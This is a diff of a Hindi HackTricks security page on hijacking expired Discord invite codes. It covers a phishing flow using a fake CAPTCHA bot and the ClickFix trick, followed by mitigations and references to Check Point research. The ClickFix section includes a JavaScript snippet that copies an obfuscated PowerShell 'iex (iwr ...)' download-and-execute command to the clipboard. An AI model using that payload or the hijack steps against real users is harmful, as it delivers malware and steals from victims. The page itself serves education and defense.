@@ -2,38 +2,38 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Discord के आमंत्रण प्रणाली की कमजोरी खतरे के तत्वों को समाप्त या हटाए गए आमंत्रण कोड (अस्थायी, स्थायी, या कस्टम वैनिटी) को किसी भी स्तर 3 बूस्टेड सर्वर पर नए वैनिटी लिंक के रूप में दावा करने की अनुमति देती है। सभी कोड को लोअरकेस में सामान्यीकृत करके, हमलावर ज्ञात आमंत्रण कोड को पूर्व-रजिस्टर कर सकते हैं और मूल लिंक समाप्त होने या स्रोत सर्वर के बूस्ट खोने पर चुपचाप ट्रैफ़िक को हाईजैक कर सकते हैं।
+Discord की invite system vulnerability threat actors को expired या deleted invite codes (temporary, permanent, या custom vanity) को किसी भी Level 3 boosted server पर नए vanity links के रूप में claim करने की अनुमति देती है। सभी codes को lowercase में normalize करके, attackers ज्ञात invite codes को पहले से pre-register कर सकते हैं और original link के expire होने या source server के अपना boost खोने के बाद traffic को चुपचाप hijack कर सकते हैं।<sup>[[1]](#references)[[2]](#references)</sup>
 
 ## Invite Types and Hijack Risk
 
 | Invite Type           | Hijackable? | Condition / Comments                                                                                       |
 |-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
-| Temporary Invite Link | ✅          | समाप्ति के बाद, कोड उपलब्ध हो जाता है और इसे एक बूस्टेड सर्वर द्वारा वैनिटी URL के रूप में फिर से रजिस्टर किया जा सकता है। |
-| Permanent Invite Link | ⚠️          | यदि हटाया गया और केवल लोअरकेस अक्षरों और अंकों से बना है, तो कोड फिर से उपलब्ध हो सकता है।        |
-| Custom Vanity Link    | ✅          | यदि मूल सर्वर अपना स्तर 3 बूस्ट खो देता है, तो इसका वैनिटी आमंत्रण नए रजिस्ट्रेशन के लिए उपलब्ध हो जाता है।    |
+| Temporary Invite Link | ✅          | Expiration के बाद code उपलब्ध हो जाता है और boosted server द्वारा vanity URL के रूप में फिर से register किया जा सकता है। |
+| Permanent Invite Link | ⚠️          | यदि इसे delete कर दिया जाए और इसमें केवल lowercase letters और digits हों, तो code फिर से उपलब्ध हो सकता है।        |
+| Custom Vanity Link    | ✅          | यदि original server अपना Level 3 Boost खो देता है, तो उसका vanity invite नए registration के लिए उपलब्ध हो जाता है।    |
 
 ## Exploitation Steps
 
 1. Reconnaissance
-- सार्वजनिक स्रोतों (फोरम, सोशल मीडिया, टेलीग्राम चैनल) पर आमंत्रण लिंक की निगरानी करें जो पैटर्न `discord.gg/{code}` या `discord.com/invite/{code}` से मेल खाते हैं।
-- रुचि के आमंत्रण कोड (अस्थायी या वैनिटी) एकत्र करें।
+- Public sources (forums, social media, Telegram channels) में `discord.gg/{code}` या `discord.com/invite/{code}` pattern से match करने वाले invite links को monitor करें।<sup>[[1]](#references)</sup>
+- रुचि वाले invite codes (temporary या vanity) collect करें।
 2. Pre-registration
-- स्तर 3 बूस्ट विशेषाधिकार के साथ एक नया या मौजूदा Discord सर्वर बनाएं या उपयोग करें।
-- **Server Settings → Vanity URL** में, लक्षित आमंत्रण कोड को असाइन करने का प्रयास करें। यदि स्वीकार किया जाता है, तो कोड दुर्भावनापूर्ण सर्वर द्वारा आरक्षित है।
+- Level 3 Boost privileges वाले Discord server को create करें या किसी existing server का उपयोग करें।
+- **Server Settings → Vanity URL** में target invite code assign करने का प्रयास करें। यदि स्वीकार हो जाता है, तो code malicious server द्वारा reserve कर लिया जाता है।
 3. Hijack Activation
-- अस्थायी आमंत्रण के लिए, मूल आमंत्रण समाप्त होने की प्रतीक्षा करें (या यदि आप स्रोत को नियंत्रित करते हैं तो इसे मैन्युअल रूप से हटा दें)।
-- बड़े अक्षरों वाले कोड के लिए, लोअरकेस संस्करण को तुरंत दावा किया जा सकता है, हालांकि रीडायरेक्शन केवल समाप्ति के बाद सक्रिय होता है।
+- Temporary invites के लिए original invite के expire होने तक wait करें (या यदि source पर आपका control है, तो उसे manually delete करें)।
+- Uppercase वाले codes के लिए lowercase variant को तुरंत claim किया जा सकता है, हालांकि redirection केवल expiration के बाद activate होता है।
 4. Silent Redirection
-- पुराने लिंक पर जाने वाले उपयोगकर्ताओं को हमलावर-नियंत्रित सर्वर पर बिना किसी रुकावट के भेजा जाता है जब हाईजैक सक्रिय होता है।
+- Hijack active होने के बाद पुराने link पर जाने वाले users को seamlessly attacker-controlled server पर भेज दिया जाता है।
 
 ## Phishing Flow via Discord Server
 
-1. सर्वर चैनलों को इस तरह से सीमित करें कि केवल **#verify** चैनल दिखाई दे।
-2. नए उपयोगकर्ताओं को OAuth2 के माध्यम से सत्यापित करने के लिए प्रेरित करने के लिए एक बॉट (जैसे, **Safeguard#0786**) तैनात करें।
-3. बॉट उपयोगकर्ताओं को एक फ़िशिंग साइट (जैसे, `captchaguard.me`) पर रीडायरेक्ट करता है जो CAPTCHA या सत्यापन चरण के रूप में प्रकट होती है।
-4. **ClickFix** UX ट्रिक लागू करें:
-- एक टूटी हुई CAPTCHA संदेश प्रदर्शित करें।
-- उपयोगकर्ताओं को **Win+R** संवाद खोलने, एक प्रीलोडेड PowerShell कमांड पेस्ट करने और Enter दबाने के लिए मार्गदर्शन करें।
+1. Server channels को restrict करें ताकि केवल **#verify** channel दिखाई दे।<sup>[[1]](#references)</sup>
+2. Newcomers को OAuth2 के माध्यम से verify करने के लिए prompt करने वाला bot (जैसे, **Safeguard#0786**) deploy करें।
+3. Bot users को CAPTCHA या verification step के बहाने phishing site (जैसे, `captchaguard.me`) पर redirect करता है।
+4. **ClickFix** UX trick implement करें:
+- एक broken CAPTCHA message display करें।
+- Users को **Win+R** dialog खोलने, पहले से loaded PowerShell command paste करने और Enter दबाने का निर्देश दें।
 
 ### ClickFix Clipboard Injection Example
 ```javascript
@@ -44,18 +44,18 @@ const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9
 `iex (iwr -Uri $url)"`;
 navigator.clipboard.writeText(cmd);
 ```
-इस दृष्टिकोण से सीधे फ़ाइल डाउनलोड से बचा जाता है और उपयोगकर्ता की संदेह को कम करने के लिए परिचित UI तत्वों का लाभ उठाया जाता है।
+यह approach direct file downloads से बचता है और user suspicion को कम करने के लिए परिचित UI elements का लाभ उठाता है।<sup>[[1]](#references)</sup>
 
 ## Mitigations
 
-- स्थायी आमंत्रण लिंक का उपयोग करें जिसमें कम से कम एक बड़ा अक्षर या गैर-अक्षरांकित चरित्र हो (कभी समाप्त न हों, पुन: उपयोग करने योग्य न हों)।
-- नियमित रूप से आमंत्रण कोड को घुमाएँ और पुराने लिंक को रद्द करें।
-- Discord सर्वर बूस्ट स्थिति और वैनिटी URL दावों की निगरानी करें।
-- उपयोगकर्ताओं को सर्वर की प्रामाणिकता की पुष्टि करने और क्लिपबोर्ड-पेस्ट किए गए कमांड को निष्पादित करने से बचने के लिए शिक्षित करें।
+- ऐसे permanent invite links का उपयोग करें जिनमें कम से कम एक uppercase letter या non-alphanumeric character हो (कभी expire न हों, दोबारा उपयोग न किए जा सकें)।<sup>[[1]](#references)</sup>
+- Invite codes को नियमित रूप से rotate करें और पुराने links को revoke करें।
+- Discord server boost status और vanity URL claims को monitor करें।
+- Users को server authenticity verify करने और clipboard-pasted commands को execute करने से बचने के लिए educate करें।
 
 ## References
 
-- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – [https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
-- Discord Custom Invite Link Documentation – [https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
+- [1] [From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
+- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
 
 {{#include ../../banners/hacktricks-training.md}}
